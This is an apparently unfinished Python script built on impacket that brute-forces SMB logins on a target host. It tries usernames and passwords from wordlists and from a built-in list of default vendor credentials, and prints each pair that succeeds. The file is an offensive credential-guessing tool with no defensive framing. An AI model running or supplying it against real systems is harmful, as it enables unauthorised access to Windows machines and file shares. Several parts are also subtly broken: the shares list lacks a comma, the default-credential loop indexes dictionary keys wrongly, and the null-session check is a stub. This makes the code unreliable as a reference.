import argparse
from impacket.smbconnection import SMBConnection, SessionError


class SmbBruteForcer(object):

    default_shares = [
        'IPC$',
        'C$',
        'D$',
        'FAX$',
        'PRINT$'
        'ADMIN$',
        'NETLOGON',
        'SYSVOL',

    ]

    default_credentials = {
        '': '',
        'guest': '',
        'Administrator': ['', 'password', 'administrator', 'admin'],
        'admin': ['', 'password', 'administrator', 'admin'],
        'arcserve': ['arcserve', 'backup'],
        'tivoli': ['tivoli', 'tmersrvd', 'admin'],
        'tmersrvd': ['tivoli', 'tmersrvd', 'admin'],
        'backupexec': ['backupexec', 'backup', 'arcada'],
        'backup': ['backupexec', 'backup', 'arcada'],
        'test': ['password', 'test', 'lab', 'demo'],
        'lab': ['password', 'test', 'lab', 'demo'],
        'demo': ['password', 'test', 'lab', 'demo'],
    }

    def __init__(self, host, port):
        self.session = SMBConnection(remoteHost=host, remoteName=host, sess_port=port)

    def bf_user_pass(self, username, password):
        try:
            self.session.login(username, password)
            print(f'{username}:{password}')
        except SessionError:
            pass
        except Exception as e:
            print(str(e))

    def bf_userlist_pass(self, userlist, password):
        try:
            f = open(userlist, 'r')
            userlist = [user.strip() for user in f.readlines()]
            f.close()

            for user in userlist:
                try:
                    self.session.login(user, password)
                    print(f'{user}:{password}')
                except SessionError:
                    pass
        except Exception as e:
            print(str(e))

    def bf_user_wordlist(self, username, wordlist):
        try:
            f = open(wordlist, 'r')
            wordlist = [word.strip() for word in f.readlines()]
            f.close()

            for word in wordlist:
                try:
                    self.session.login(username, word)
                    print(f'{username}:{word}')
                except SessionError:
                    pass
        except Exception as e:
            print(str(e))

    def bf_userlist_passlist(self, userlist, wordlist):
        try:
            f = open(userlist, 'r')
            userlist = [user.strip() for user in f.readlines()]
            f.close()

            f = open(wordlist, 'r')
            wordlist = [word.strip() for word in f.readlines()]
            f.close()

            for user in userlist:
                for word in wordlist:
                    try:
                        self.session.login(user, word)
                        print(f'{user}:{word}')
                    except SessionError:
                        pass
        except Exception as e:
            print(str(e))

    def bf_lucky(self):
        for credential in self.default_credentials:
            user = credential[0]
            passwords = credential[1]
            for password in passwords:
                try:
                    self.session.login(user, password)
                    print(f'{user}:{password}')
                except SessionError:
                    pass

    def check_null(self):
        try:
            print('asdf')
        except Exception as e:
            print(str(e))


parser = argparse.ArgumentParser()
subparser = parser.add_subparsers()
parser.add_argument('-H', '--host', help='host of the target smb server', required=True)
parser.add_argument('-P', '--port', help='port of the target smb server', required=True)

brute_parser = subparser.add_parser('brute')
group_user = brute_parser.add_mutually_exclusive_group(required=True)
group_pass = brute_parser.add_mutually_exclusive_group(required=True)
group_user.add_argument('-u', '--username', help='username to brute force')
group_user.add_argument('-U', '--userlist', help='user list to brute force')
group_pass.add_argument('-p', '--password', help='password to use')
group_pass.add_argument('-w', '--wordlist', help='wordlist to use')

brutedefault_parser = subparser.add_parser('brutedefault')
#parser.add_argument('brutedefault', action='store_true')

checknull_parser = subparser.add_parser('checknull')
group_null = checknull_parser.add_mutually_exclusive_group(required=False)
checknull_parser.add_argument('-s', '--share', help='share to check')
checknull_parser.add_argument('-S', '--shares', help='shares to check')


args = parser.parse_args()
brute_forcer = SmbBruteForcer(args.host, args.port)


if hasattr(args, 'username') and hasattr(args, 'password'):
    brute_forcer.bf_user_pass(username=args.username, password=args.password)
elif hasattr(args, 'userlist') and hasattr(args, 'password'):
    brute_forcer.bf_userlist_pass(userlist=args.userlist, password=args.password)
elif hasattr(args, 'username') and hasattr(args, 'wordlist'):
    brute_forcer.bf_user_wordlist(username=args.username, wordlist=args.wordlist)
elif hasattr(args, 'userlist') and hasattr(args, 'wordlist'):
    brute_forcer.bf_userlist_passlist(userlist=args.userlist, wordlist=args.wordlist)
#Todo: this isn't recognized yet
elif hasattr(args, 'brutedefault'):
    brute_forcer.bf_lucky()